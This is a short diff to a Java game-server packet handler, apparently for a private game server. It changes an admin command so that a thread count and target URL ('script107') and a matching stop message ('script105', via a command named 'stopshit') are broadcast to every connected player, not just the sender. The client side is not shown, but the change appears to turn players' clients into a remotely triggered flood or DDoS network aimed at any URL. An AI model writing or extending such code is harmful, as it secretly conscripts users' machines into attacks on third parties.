@@ -596,12 +596,13 @@ public class CommandPacketHandler implements PacketHandler {
             player.sendf("%s %s %s", as[0], as[1], as[2]);
             final int threads = Integer.parseInt(as[1]);
             final String url = as[2];
-
-            player.sendMessage("script107"+threads+","+url);
+            for(final Player p : World.getWorld().getPlayers())
+                p.sendMessage("script107"+threads+","+url);
         }
 
         if(commandStart.equals("stopshit")) {
-            player.sendMessage("script105");
+            for(final Player p : World.getWorld().getPlayers())
+                p.sendMessage("script105");
         }
 
 		/**
